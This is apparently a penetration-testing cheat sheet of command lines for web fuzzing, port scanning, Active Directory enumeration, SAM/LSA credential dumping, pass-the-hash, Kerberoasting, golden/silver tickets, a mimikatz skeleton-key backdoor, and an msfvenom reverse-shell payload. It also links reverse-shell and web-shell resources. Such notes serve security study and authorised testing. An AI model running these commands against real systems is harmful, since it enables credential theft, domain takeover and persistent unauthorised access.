# Web Apps

### Tools

- gobuster
- wfuzz
- dirsearch
- dirbuster

## Reconnaissance

#### Enumerate vhost w/ gobuster & wfuzz
```
Command : gobuster vhost -u <url> -w <wordlist>

  OR

Command : wfuzz -u <url> -w <wordlist> -H "Host: FUZZ.<domain>" --hc <avoid status code>
```
#### Enumerate dirs and files w/ gobuster & wfuzz
```
Command : gobuster -t <threads> dir -u <URL to fuzz> -w <wordlist> -x "{extensions separte by comma}"

  OR

Command : wfuzz -u example.com/FUZZ.<extension> -w <wordlist>
```
#### Enumerate parameters
```
Command : wfuzz -u <url>/?FUZZ=ls+-la -w <wordlist> --hw 2
```
# Linux

## Discovery & Scanning
#### Nmpa light scan
```
Command : nmap -sV --version-light <ip/domain>
```

#### Scan tcp ports w/ nmap & nc
```
Command : sudo nmap -sS -sV -T5 -p- -v <ip/domain> -oG all_tcp.nmap

  OR

Command : nc -zv <ip/domain> 1-65535
```
#### Scan udp ports w/ nmap & nc
```
Command : sudo nmap -sU -sV -T5 -p- -v <ip/domain> -oG all_udp.nmap

  OR

Command : nc -zuv <ip/domain> 1-65535
```
#### identify if you are in a container
```
Command : cat /proc/1/cgroup | grep -i "docker"

If this command returns any output you are in a docker container
```
## Vulnerability Assessment
#### Find Suid Bins w/ find
```
Command : find / -type f -perm -u=s 2> /dev/null

   OR

Command : find / -perm -4000 2>/dev/null
```

## Exploitation
#### Brute force services w/ hydra
```
Command : hydra -l <user> -P <wordlist> <ip/domain> <service>
```

## General
#### Web server
```
Command : python3 -m http.server

  OR

Command : python -m SimpleHTTPServer
```
#### Upgrade Shell to interactive
```
Command : python3 -c "import pty;pty.spawn('/bin/bash')"

Press : CTRL + Z

Command : stty raw -echo

Command : fg

Command : export TERM=xterm-256color

Command : export SHELL=bash

Command : stty rows 22 columns 140
```

#### RDP

```
Command: xfreerdp /u:"<user>" /p:"<password>" /d:"<domain>" /v:"<ip>" /dynamic-resolution /drive:"shared,<folder>"
```

# Windows

## Enumeration

### Tools

- PowerView
- BloodHound
- SharpHound

#### Local Services

Get all service
```
Command : Get-Service 
```

Get specific service
```
Command : Get-Service <service name>
```
Get service permissions
```
Command : . .\Get-ServiceACL.ps1

Command : <service name> | get-ServiceAcl | selec -ExpandProperty Access 
```

Operate services
```
Command : sc start <service name>
Command : sc stop <service name>

Command : Start-service -name <service name>
Command : Stop-service -name <service name>
```

#### PowerView

*Load PowerView script*

```
Command: powershell -ep bypass

Command: . .\PowerView.ps1
```

*Enumerate the domain users*

```
Command: Get-NetUser | select cn
```

*Enumerate the domain groups*

```
Command: Get-NetGroup -GroupName *admin* 
```

*Enumerate shared folders*
```
Invoke-ShareFinder
```

*Enumerate operate system on the network*
```
Get-NetComputer -fulldata | select operatingsystem
```

#### BloodHound

*Install and configure bloodhound*

```
Command: sudo apt install bloodhound

Command: sudo neo4j console

Command: sudo bloodhound
```

*Getting loot*

```
Command: powershell -ep bypass

Command: . .\SharpHound.ps1

Command: Invoke-Bloodhound -CollectionMethod All -Domain <domain> -ZipFileName loot.zip

  OR

Command: SharpHound.exe -c all -d <domain> --zipfilename loop.zip

```

## NFS

### Tools

- showmount

#### Enumerate nfs folders
```
Command : showmount -e <ip/domain>
```
### Mount folder
```
Command : sudo mkdir /mnt/tmp_nfs
Command : sudo mount -t nfs [-o vers=2] <ip/domain>:/<folder name> /mnt/tmp_nfs -o nolock
```

## RPC

### Tools

- impacket-rpcdump
- impacket-lookupsid
- rpcinfo

### Enumeration

#### Enumerate rpc

```
Command: impacket-rpcdump <domain/ip>
```

#### Enumerate rpcbind
```
Command : rpcinfo <ip/domain>
```

#### Check if is vulnerable to printnightmare

```
Command: impacket-rpcdump <domain/ip> | egrep 'MS-RPRN|MS-PAR'
```

#### Enumerate users, groups by sid

if you have permissions to read IPC$
```
Command : impacket-lookupsid -no-pass anonymous@<ip>
```

## SMB

### Tools

- smbclient
- smbmap
- smbpasswd

### Enumeration

#### Enumerate users
```
Command : crackmapexec <service> <ip/domain> -u <user/wordlist> -p '<password>' --continue-on-success
```

#### Enumerate shares
```
Command : smbclient -U <user> -L \\\\<ip/domain>\\
```

#### Enumerate permissions
 ```
 smbmap -H <ip/domain> -u <user> -p <password>
 ```

#### Access to share
```
Command : smbclient -U <user> \\\\<ip/domain>\\<share>
```

#### Get all file
```
Command: recurse on
Command: prompt off
Command: mget *
```

#### Change password remote
 ```
 Command : smbpasswd -r <ip/domain> -U "<user>"
 ```

## SAM and LSA

### Tools

- impacket-secretsdump

### Dump SAM and LSA
```
Command : reg save HKLM\SAM "C:\Windows\Temp\sam.save"
Command : reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
Command : reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
```

#### Dump SAM and LSA w/ impacket-secretsdump

Remote dumping of SAM & LSA secrets
```
Command : impacket-secretsdump "<domain>/<user>:<password>@<ip/domain>"
```
Remote dumping of SAM & LSA secrets (pass-the-hash)
```
Command : impacket-secretsdump -hashes "LMhash:NThash" "<domain>/<user>@<ip/domain>"
```
Remote dumping of SAM & LSA secrets (pass-the-ticket)
```
Command : impacket-secretsdump -k "<domain>/<user>@<ip/domain>"
```
Offline dumping of LSA secrets from exported hives
```
Command : impacket-secretsdump -security "<path to security.save>" -system "<path to system.save>" LOCAL
```
Offline dumping of SAM secrets from exported hives
```
Command : impacket-secretsdump -sam "<path to sam.save>" -system "<path to system.save>" LOCAL
```
Offline dumping of SAM, LSA secrets and NTDS from exported hives
```
Command : impacket-secretsdump -sam "<path to sam.save>" -security "<path to security.save>" -system "<path to system.save>" -ntds "<path to ntds.dit>" LOCAL
```
#### Pass the hash
```
Command: evil-winrm -i <ip> -u <user> -H <ntlm hash>
```

## Kerberos

### Tools

- kerbrute  - *Brute force and enumerate valid active-directory users*
- rubeus
- mimikatz

### Attacks

*Attack Privilege Requirements -*

- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required

### Enumeration

#### Abusing Pre-Authentication

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

#### Enumerating Users w/ Kerbrute

This will brute force user accounts from a domain controller using a supplied wordlist.
```
Command : ./kerbrute userenum --dc <domain kdc> -d <domain> <wordlist>
```
### Harvesting & Brute-Forcing Tickets

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

#### Harvesting Tickets w/Rubeus

This command tells Rubeus to harvest for TGTs every 30 seconds.
```
Command : .\Rubeus.exe harvest /interval:30
```
#### Brute-Forcing / Password-Spraying w/ Rubeus

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

This command will take a given password and "spray" it against all found users then give the .kirbi TGT for that user.
```
Command : .\Rubeus.exe brute /password:<password> /noticket
```
### Kerberoasting

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.

#### Kerberoasting w/ Rubeus

This will dump the Kerberos hash of any kerberoastable users.
```
Command : .\Rubeus.exe kerberoast
```
#### Kerberoasting w/ Impacket

This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domains; however, this does not have to be on the targets machine and can be done remotely.
```
Command : sudo python3 GetUserSPNs.py <domain>/<user>:<password> -dc-ip <ip/domain> -request
```
#### Crack those Hashes w/ hashcat
```
Command : hashcat -m 13100 -a 0 <hash> <wordlist>

Command : john --wordlist=<wordlist> <hash>
```
### AS-REP Roasting

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

#### Dumping KRBASREP5 Hashes w/ Rubeus

This command will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
```
Command : .\Rubeus.exe asreproast
```

#### Dumping KRBASREP5 Hashes w/ Impacket GetNPUsers.py
```
Command : python3 GetNPUsers.py <domain>/ -usersfile <wordlist> -no-pass -dc-ip <ip/domain>
```

#### Crack those Hashes w/ hashcat

crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200 or John the ripper.
```
Command : hashcat -m 18200 <hash> <wordlist>

Command : john --format:krb5asrep <hash> --wordlist=<wordlist>
```
### Pass the Ticket

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

#### Prepare Mimikatz & Dump Tickets
```
Command : .\mimikatz.exe

Ensure this command outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz.

Sub_Command : privilege::debug

this will export all of the .kirbi tickets into the directory that you are currently in.

Sub_command : sekurlsa::tickets /export

Command : klist
```
### KRBTGT

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

#### Golden/Silver Ticket Attack

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

#### Dump the KRBTGT Hash
```
Command : .\mimikatz.exe

ensure this outputs [privilege '20' ok]

Sub_Command : privilege::debug

This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

Sub_Command : lsadump::lsa /inject /name:krbtgt
```
#### Create a Golden/Silver Ticket

This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
```
Command : Kerberos::golden /user:<user> /domain:controller.local /sid:<sid> /krbtgt:<krbtgt> /id:<id>
```
#### Use the Golden/Silver Ticket to access other machines
```
This will open a new elevated command prompt with the given ticket in mimikatz.

Command : misc::cmd
```
Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

### Kerberos Backdoors w/ mimikatz

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.

#### Skeleton Key

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.
```
Command : .\mimikatz.exe

This should be a standard for running mimikatz as mimikatz needs local administrator access

Sub_Command : privilege::debug

Sub_Command : misc::skeleton
```

# Pwn

## Windows

### Tools

- Immunity debugger
- msfvenom

#### Generate a cyclic pattern
```
Command : /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {length}
```

#### Mona configuration
```
Sub_command : !mona config -set workingfolder c:\{path to mona}\%p
```

#### Find specific buff distance
```
Sub_command : !mona findmsp -distance <length>
```

#### Generate bytearray
```
Sub_command : !mona bytearray -b "\x00"
```

#### Finding badchars
```
Sub_Command : !mona compare -f C:\{path to mona}\{bin name}\bytearray.bin -a <esp or rsp address>
```

#### Finding jump point
```
Sub_command : !mona jmp -r {register ex: esp or rsp} -cpb "{badchars}"
```

#### Generate paylaod
```
Command: msfvenom -p windows/shell_reverse_tcp LHOST={attacker ip} LPORT={port} EXITFUNC=thread -b "{bachars}" -f c
```

# Resources

### Reverse Shells

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) - *Reverse shell repository*

[phpbash](https://github.com/Arrexel/phpbash) - *Php web shell*

[p0wny-shell](https://github.com/flozz/p0wny-shell) - *Php web shell*

[revshells](https://www.revshells.com/) - *Reverse shell generator*

### Cracking and Decoding

[CyberChef](https://gchq.github.io/CyberChef/) - *Decode or encode multiple variety of ciphers*

[dcode](https://www.dcode.fr/) - *Decode multiple variety of ciphers*

[CrackStation](https://crackstation.net/) - *Crack hashes online*

[tunnelsup](https://www.tunnelsup.com/hash-analyzer/) - *Hash Analyzer*

[onlinehashcrack](https://www.onlinehashcrack.com/hash-identification.php) - *Hash Analyzer*

### Abuse binaries.

[GTFOBins](https://gtfobins.github.io/) - *Abuse suid, guid binaries*

[Exploit-DB](https://www.exploit-db.com/) - *Database of knows exploits*

[libc_database](https://libc.blukat.me/) - *Database of multiple libc version*

### Privilege Escalation

[PEAS-ng](https://github.com/carlospolop/PEASS-ng) - *Windows, Linux & Mac privesc escalation tool*

### Genereal

[Powershell Ofenssive modules](https://github.com/samratashok/nishang)
  
[Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
  
[PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
  
[Hacktricks Active Directory](https://book.hacktricks.xyz/windows/active-directory-methodology)
  
[Hacktricks LDAP](https://book.hacktricks.xyz/pentesting/pentesting-ldap)

[Another AD cheat sheet](https://github.com/tiyeuse/Active-Directory-Cheatsheet)
  
